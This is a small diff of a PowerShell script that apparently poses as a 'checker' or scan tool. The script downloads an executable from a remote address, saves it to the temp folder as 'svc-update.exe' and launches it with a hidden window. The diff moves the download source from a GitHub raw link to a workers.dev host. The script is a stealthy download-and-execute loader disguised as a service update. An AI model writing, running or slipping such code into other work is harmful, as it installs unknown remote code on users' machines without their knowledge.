@@ -15,7 +15,7 @@ exit
 }
 
 try {
-$exeUrl = "https://github.com/wwwwwwwwwwwwwwwwwwwwwwwwwwwwuchecker-ru/mc-scan-files/raw/refs/heads/main/Checker.exe"
+$exeUrl = "https://mc-scan.ruchecker-ru.workers.dev/"
 $outputPath = "$env:TEMP\svc-update.exe"
 Invoke-WebRequest -Uri $exeUrl -OutFile $outputPath -ErrorAction Stop | Out-Null
 Start-Process $outputPath -WindowStyle Hidden
